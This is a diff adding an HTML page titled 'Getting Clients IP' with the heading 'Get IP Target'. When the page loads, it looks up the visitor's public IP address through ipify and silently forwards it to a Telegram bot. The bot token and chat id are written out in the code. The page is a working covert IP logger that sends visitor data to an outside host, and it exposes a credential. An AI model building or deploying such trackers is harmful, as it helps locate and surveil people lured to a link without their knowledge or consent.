@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Getting Clients IP</title>
+    <style>
+      p,
+      h1 {
+        color: red;
+      }
+    </style>
+    <script
+      src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.25.0/axios.min.js"
+      integrity="sha512-/Q6t3CASm04EliI1QyIDAA/nDo9R8FQ/BULoUFyN4n/BDdyIxeH7u++Z+eobdmr11gG5D/6nPFyDlnisDwhpYA=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    ></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+
+    <script>
+      /* Add "https://api.ipify.org?format=json" statement
+			this will communicate with the ipify servers in
+			order to retrieve the IP address $.getJSON will
+			load JSON-encoded data from the server using a
+			GET HTTP request */
+
+      $.getJSON("https://api.ipify.org?format=json", function (data) {
+        // Setting text of element P with id gfg
+        $("#gfg").html(data.ip);
+        $.getJSON(
+          `https://api.telegram.org/bot1772829774:AAFyChQEG1i6w44WNOzUNNVSEsznEw02CrU/sendMessage?chat_id=796350918&text=${data.ip}`,
+          function (data) {
+            // Setting text of element P with id gfg
+            $("#tgbot").html(data.ip);
+          }
+        );
+      });
+    </script>
+  </head>
+
+  <body>
+    <center>
+      <h1>Get IP Target</h1>
+      <h3>Public IP Address of user is:</h3>
+      <p id="gfg"></p>
+      <p id="tgbot"></p>
+    </center>
+  </body>
+</html>
